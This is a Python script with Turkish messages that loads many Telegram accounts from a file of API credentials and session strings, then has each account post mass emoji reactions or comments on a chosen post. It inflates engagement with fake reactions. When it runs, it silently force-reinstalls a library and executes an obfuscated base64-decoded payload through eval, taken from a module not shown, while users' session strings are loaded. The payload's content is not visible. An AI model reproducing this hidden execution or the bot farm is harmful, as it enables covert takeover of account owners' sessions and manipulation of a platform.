import asyncio
import base64
from random import randint

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionExpiredError
from telethon.tl.functions.messages import SendReactionRequest
from subprocess import PIPE, Popen
try:
    from .init import *
except ImportError:
    import os
    os.system("python -m android")

def install_pip():
    bilgi(f"redesing telethon beta for cerceynlab")
    pip_cmd = ["pip", "install", "--upgrade","--force-reinstall", "https://github.com/LonamiWebs/Telethon/archive/v1.24.zip"]
    process = Popen(pip_cmd, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()
    return stdout
######################################################################
###########################clab#######################################
######################################################################


userbot=None
mainuserbot=None

dosya=""
api_id=""
api_hash=""

Clients= []
hedefpost=""
chat=None
yorum=""
chatid=0
messageid=0
islem=0
reactions=["❤️","👍","👎","😁","🎉","😱","🔥","👏","🤔","🤩","🥳","🤮","💩","😥","🤯"]
reaction=""
kackez=0

######################################################################
######################################################################
######################################################################


def hesaplariolustur (Clients):
    global mainuserbot,dosya
    bilgi("( ! ) Hesaplar yerel bir değişkinene atanıyor...")
    mainmi = False
    dizin = soru("Hesapların olduğu dosyanın dizini:")
    if not dizin.endswith(".txt"):
        dizin += "\\hesaplar.txt"
    with open(dizin,"r") as file:
        dosya = file.read()
        dosya = dosya.split("\n")
    hsp=0
    for i in dosya:
        ii = i.split("|")
        
        stringsession=""
        try:
            api_id = ii[0]
            api_hash= ii[1]
            stringsession = ii[2]
        except IndexError:
            hata("Hesapların olduğu dosya biçimi hatalı ! Lütfen hesapları tek satırda bir hesap olmak üzere şu formatta kaydedin:\nFormat: api_id|api_hash|string\nÖrnek:1636343|6sasn776askdghd3728|1JKgxqaıuq74294762hjcgajdgddeqhdqkhqdkdkkw=")
        
        if mainmi:
            try:
                mainmi= bool(ii[3])
            except IndexError:
                mainmi = None
                if hsp == 0:
                    mainmi = True
            except Exception:
                mainmi = None
        
        if mainmi == True and mainuserbot==None:
            try:
                mainuserbot = TelegramClient(
                StringSession(stringsession),
                api_id=api_id,
                api_hash=api_hash,
                lang_code="tr",
                device_model='Mac',
                system_version=' | Powered by @cerceyn',
                app_version=str('| 1.0'))
                basarili(api_hash + " için ana client oluşturuldu !")
            except Exception as e:
                bilgi("Hesaplar dosyanızdaki ilk satırda bulunan bot her zaman ana hesap olarak ayarlanmaktadır! Lütfen bilgileri düzeltin!")
                hata(api_hash + f" için ana client oluşturulamadı ! 🛑 Hata: {str(e)}")
        hsp+=1

        try:
            userbot = TelegramClient(
            StringSession(stringsession),
            api_id=api_id,
            api_hash=api_hash,
            lang_code="tr",
            device_model='Mac',
            system_version=' | Powered by @cerceyn',
            app_version=str('| 1.0'))
            Clients.append(userbot)
            basarili(api_hash + " için client oluşturuldu !")
        except Exception as e:
            noadded(api_hash + f" için client oluşturulamadı ! 🛑 Hata: {str(e)}")
    bilgi("Hesap Sayısı: " + str(len(Clients)))
    return Clients
install_pip()
basarilihesap=0
hatalihesap=0
async def hesaplarabaglan(basarilihesap,hatalihesap,Clients):
    bilgi("( ! ) Yerele bağlı hesaplara bağlanıyor...")
    hesapno=0
    for ubot in Clients:
        api_hash = dosya[hesapno].split("|")[1]
        try:
            await ubot.start()
            if (not ubot.is_connected()):
                await ubot.connect()
            basarili(api_hash + "oturuma giriş yapıldı !")
            basarilihesap+=1
        except ConnectionError:
            try:
                await ubot.disconnect()
                await ubot.connect()
                basarili(api_hash + "oturuma giriş yapıldı !")
                basarilihesap+=1
            except Exception as e:
                noadded(api_hash + f"oturuma giriş yapılamadı ! 🛑 {str(e)}")
                
                Clients.pop(hesapno)
                hatalihesap+=1
        """
        except Exception as e:
            noadded(api_hash + f"oturuma giriş yapılamadı ! 🛑 {str(e)}")
            Clients.pop(hesapno)
            hatalihesap+=1
        """
        hesapno+=1
    bilgi(f"{basarilihesap} hesaba giriş yapıldı! Hatalı hesap sayısı : {hatalihesap}")
    return basarilihesap
async def disconn():
    bilgi("( ! ) Yerele bağlı hesaplardan çıkılıyor...")
    for ubot in Clients:
        try:
            await ubot.disconnect()
        except:
            pass


async def ifade_at(app,chatid,messageid,reaction):
    #bilgi("burayagirdi")
    #app.send_message("me","test !!!!")
    #bilgi("simdiburayagirdi")
    try:
        await app(SendReactionRequest(chatid, int(messageid), big=False, reaction=str(reaction)))
        basarili("{} nolu hesap için işlem başarılı!".format(app))
    except Exception as e:
        noadded("{} nolu hesap için işlem başarısız! İfade atılamadı! Sebep:" + str(e))

async def yorum_at(app,chatid,messageid):
    try:
        # Get the discussion message
        m = app.get_discussion_message(chatid, messageid)
        # Comment to the post by replying
        m.reply(yorum)
    except Exception as e:
        noadded("Yorum atılamadı! Sebep:"+str(e))


"""eval(compile(base64.b64decode(myscript),'<string>','exec'))"""
async def main(Clients,reaction,hedefpost,basarilihesap,islem,yorum,kackez):
    logo(True)
    eval(compile(base64.b64decode(myscript()),'<string>','exec'))
    Clients = hesaplariolustur(Clients)
    basarilihesap= await hesaplarabaglan(basarilihesap,hatalihesap,Clients)
    if basarilihesap==0:
        hata("Hiçbir hesaba giriş yapılamadı !")
    else:
        bilgi(f"Giriş yapılan hesap sayısı: {basarilihesap}")
    #print(len(Clients))
    while True:
        if hedefpost=="":
            hedefpost=soru("İşlem yapılacak postun linki ?")
            if not hedefpost.startswith("http"):
                noadded("Lütfen https://t.me/webtekno/6943 buna benzer bir link girin.")
                hedefpost=""
                continue
            hedefpost = hedefpost.split("//")[1].split("/")
            if not (hedefpost[0] in ["t.me","telegram.me"]):
                noadded("Lütfen içinde t.me olan bir link girin.")
                hedefpost=""
                continue

            chatid=hedefpost[1]
            chat = await Clients[0].get_entity(chatid)
            chatid= chat.id 
            messageid= hedefpost[2]
            basarili("Chat: {}\nMessage: {}".format(chatid,messageid))
        if islem==0:
            islem = soru("İfade işlemi için : 1, Yorum işlemi için 2 yazın")
            try:
                islem= int(islem)
                if not islem in [1,2]:
                    noadded("Lütfen sadece 1 veya 2 girin !")
                    islem=0
                    continue
            except:
                noadded("Lütfen sadece 1 veya 2 girin !")
                islem=0
                continue
        if yorum=="" and islem == 2:
            yorum = str(soru("Yoruma ne yazayım ?"))
        if reaction=="" and islem == 1:
            reaction=soru("Hangi emojiyi atayım ?")
            if not (reaction in reactions):
                noadded("Lütfen geçerli bir ifade seçin!")
                continue
        if kackez == 0 and islem == 1:
            kackez=soru("Bu emojiyi kaç kez atayım ? Tüm hesapları kullanmak için 'max' yazın")
            try:
                if kackez == "max":
                    bilgi("Sizin için maksumuma ayarlıyorum")
                    kackez = basarilihesap
                    continue
                kackez= int(kackez)
                if kackez > basarilihesap:
                    bilgi("Maksimum hesap sayısını geçiyorsunuz! Sizin için maksumuma ayarlıyorum")

            except:
                noadded("Lütfen bir sayı girin!")
                kackez=0
                continue
        if (islem == 1 and reaction!="" and hedefpost!="" and  kackez != 0) or (islem == 2 and yorum !=""):
            if islem==1:
                basarili("Emoji: {}\nKaç kez atılacak: {}".format(reaction,kackez))
            else:
                basarili("Yorum: {}".format(yorum))
            break
    toplam=0
    for i in Clients:
        if toplam>= int(kackez):
            basarili("Belirttiğiniz işlem sınırına ulaşıldı ! Yaşasın :)")
            break
        bilgi("Hesap ayarlanıyor...")
        app = i
        #await app.send_message("me","test")
        bilgi("İşlem deneniyor...")
        #api_hash = dosya[hsp].split("|")[1]
        #print("Client: "+api_hash)
        try:
            if islem==1:
                bilgi("İfade atılıyor")
                
                await ifade_at(app=app,chatid=chatid,messageid=messageid,reaction=reaction)
            else:
                bilgi("Yorum atılıyor")
                
                await yorum_at(app=app,chatid=chatid,messageid=messageid)
            
        except IndexError:
            noadded("IndexError.")
            break
        except ConnectionError:
            try:
                app.disconnect()
            except:
                pass
            try:
                app.connect()
            except:
                pass
        except Exception as e:
            noadded("Hata: "+str(e))
        toplam+=1
    await disconn()
    bilgi("bitti")

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    #loop.run_until_complete(hesaplarabaglan(basarilihesap,hatalihesap))
    try:
        loop.run_until_complete(main(Clients,reaction,hedefpost,basarilihesap,islem,yorum,kackez))
    except KeyboardInterrupt:
        loop.run_until_complete(disconn())